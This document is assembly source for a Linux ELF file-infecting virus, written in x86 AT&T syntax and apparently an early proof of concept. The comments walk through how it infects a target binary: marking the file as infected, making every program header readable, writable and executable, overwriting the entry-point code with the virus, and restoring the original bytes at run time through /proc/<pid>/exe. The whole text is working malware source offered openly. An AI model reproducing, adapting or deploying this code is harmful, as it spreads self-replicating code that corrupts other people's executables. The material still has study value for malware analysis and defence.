# some system-calls
CLOSE = 6
OPEN = 5
LSEEK = 19
WRITE = 4
READ = 3
GETPID = 20

# some definitions from .h files
O_RDONLY = 0
O_RDWR = 2
SEEK_SET = 0
SEEK_CUR = 1
SEEK_END = 2

TEXTADDR = 0x8048000
ELF32_MAGIC = 0x464c457f 	# this is little endian, the right value is 0x7f454c46
ELF32_LEN = 52
PHDR32_LEN = 32

EM_386 = 3
EM_486 = 6

.data
	.align 4
.globl main
	.type	 main, @function
	
main:	call virus		# save entry-point
virus:	popl %edi
	subl $5, %edi
	pushl %edi

	pushf		
	pusha
	pushl %ebp
	
# reserve some space on the stack ...

	movl %esp, %ebp
	subl $2000, %esp
	
	call next
	
S1: .string "./test"			# 7 bytes 
S2: .string "/proc/xxxxxxxxxx"		# 17 bytes 
S3: .string "/exe"			# 5 bytes

next:
	popl %esi		# adress of S1
		
find_file:
			
# open file and give back fd in %ebx
open_file:
	movl $OPEN, %eax	
	movl %esi, %ebx		# get S1
	movl $O_RDWR, %ecx
	int $0x80
	movl %eax, %ebx

# read in Elf32-header, and seek back filepointer to 0

	movl $READ, %eax
	leal -2000(%ebp), %ecx
	movl $ELF32_LEN, %edx
	int $0x80
	
	movl $LSEEK, %eax
	xorl %ecx, %ecx
	movl $SEEK_SET, %edx
	int $0x80

# check if ELF-file

	cmpl $ELF32_MAGIC, -2000(%ebp)
	jne leave_virus
	
# check if already infected (e_type == EM_486)
	
	cmpb $EM_486, -1982(%ebp)
	je leave_virus

# if not, mark it as infected

	movb $EM_486, -1982(%ebp)
	movl $WRITE, %eax
	leal -2000(%ebp), %ecx
	movl $ELF32_LEN, %edx
	int $0x80
	
	movl -1976(%ebp), %ecx		# save e_entry, we need it later for
	pushl %ecx			# position in host where we seek to
	
# seek to e_phoff

	movl $LSEEK, %eax
	movl -1972(%ebp), %ecx
	movl $SEEK_SET, %edx
	int $0x80	
	
	movw -1956(%ebp), %ecx		# get e_phnum (2 bytes)
l1:	pushl %ecx
	movl $READ, %eax		# read in program header
	leal -2000(%ebp), %ecx
	movl $PHDR32_LEN, %edx
	int $0x80

	movl $LSEEK, %eax 		# seek back these bytes
	xorl %ecx, %ecx
	subl $PHDR32_LEN, %ecx
	movl $SEEK_CUR, %edx
	int $0x80		

	movb $7, -1976(%ebp)		# set falgs to PT_READ|PT_EXEC|PT_WRITE (
					# Huh? Elf32 requires a word (4 bytes) here
					# but for what ? 7 is the greatest value...
	
	movl $WRITE, %eax		# write back programheader
	leal -2000(%ebp), %ecx
	movl $PHDR32_LEN, %edx
	int $0x80

	popl %ecx
	loop l1		

# seek to (TEXTADDR - e_entry) in file

	movl $LSEEK, %eax
	popl %ecx			# get back e_entry
	subl $TEXTADDR, %ecx
	pushl %ecx			# save virii-pos, we need it later
	movl $SEEK_SET, %edx
	int $0x80
	
# read and save bytes that we will overwrite
# onto stack

	movl $READ, %eax
	leal -2000(%ebp), %ecx
	movl $(END-main), %edx
	int $0x80
	
# and write back to end of file (first seek there)

	movl $LSEEK, %eax
	xorl %ecx, %ecx
	movl $SEEK_END, %edx
	int $0x80
	
	movl $WRITE, %eax
	leal -2000(%ebp), %ecx
	movl $(END-main), %edx
	int $0x80
	
# seek back to virii-position

	movl $LSEEK, %eax
	popl %ecx		# get back saved position
	movl $SEEK_SET, %edx
	int $0x80

# write viruscode to file

	movl $WRITE, %eax
	movl %edi, %ecx
	movl $(END-main), %edx
	int $0x80
	
# close file 

close_file:
	movl $CLOSE, %eax
	int $0x80

# move end of virus to stack
# and jump there

leave_virus:
	call lvl1
lvl1:	popl %ebx
	subl $5, %ebx
	
	pushl %edi	
	pushl %esi	

	movl $(END-before_end), %ecx	# number of bytes
	movl %ebx, %esi			# from where ?
	addl $(before_end-leave_virus), %esi
	
	leal -1000(%ebp), %edi		# to where ?
	cld
	rep
	movsb

	popl %esi
	popl %edi

# OK, moved -- jump there
	leal -1000(%ebp), %eax
	pushl %eax
	ret

# construct "/proc/<PID>/exe"

before_end:
	pushl %edi
	pushl %esi

	addl $13, %esi		# adress from S2+6 in %esi
	movl %esi, %edi
	addl $11, %edi		# and from S3 in %edi

	movl $GETPID, %eax
	int $0x80
	
	pushl %eax
	pushl %esi
	call pid2string
	addl $8, %esp
	
bl1:	incl %esi
	cmpb $120, (%esi)	# is it a 'x' ?
	jne bl1			# go to end of string; %esi now holds adress of end
				# of S2

	pushl %esi		# source and dest are wrong
	pushl %edi
	popl %esi
	popl %edi

	movl $5, %ecx
	rep
	movsb
	
	movb $0, (%edi)		# OK, moved string, store 0 after it
	
	popl %esi
	popl %edi
	
# open it 
	
	movl $OPEN, %eax
	movl %esi, %ebx
	addl $7, %ebx		# /proc/<PID>/exe
	movl $O_RDONLY, %ecx
	int $0x80

	movl %eax, %ebx

# move original bytes from victum to memory
# so seek to end this position,

	movl $LSEEK, %eax
	xorl %ecx, %ecx
	subl $(END-main), %ecx
	movl $SEEK_END, %edx
	int $0x80

# read in # bytes

	movl $READ, %eax
	leal -2000(%ebp), %ecx
	movl $(END-main), %edx
	int $0x80	
	
#
	movl $CLOSE, %eax
	int $0x80

# move original bytes to memory

	
	leal -2000(%ebp), %esi
	movl $(END-main), %ecx
	rep
	movsb

# restore registers/flags	
	
	movl %ebp, %esp
	popl %ebp
	popa
	popf
	ret

# in C you would call it like 
#	pid2string(s, int pid)
# where pid will be stored at adress s

pid2string:
	pushl %ebp
	movl %esp, %ebp
	subl $100, %esp
	pusha
	pushl %edi
	pushl %esi

	movl 12(%ebp), %eax	# second argument
	
	cltd
	xorl %ecx, %ecx

	leal -100(%ebp), %ebx	# our local buffer
	movl $10, %esi		
pl2:
	divl %esi
	
	addb $48, %dl
	movb %dl, (%ebx)	# save rest of division
	incl %ebx
	incl %ecx

	mull %esi		# 
	
	divl %esi		# next power of 10
	cmpl $0, %eax
	je outta
	jmp pl2

outta:	movl 8(%ebp), %edi	# first paramter to this function
				# %ebx already holds adress of end of our buffer
	decl %ebx		# but adjust it a bit 
	    
pl3:	movb (%ebx), %dl
	movb %dl, (%edi)
	incl %edi
	decl %ebx
	decl %ecx
	jnz pl3			# now at adress 8(%ebp) is the right string ...

	popl %esi
	popl %edi
	popa
	movl %ebp, %esp
	popl %ebp
	ret

END:				# the rest of the victum-code goes here ...
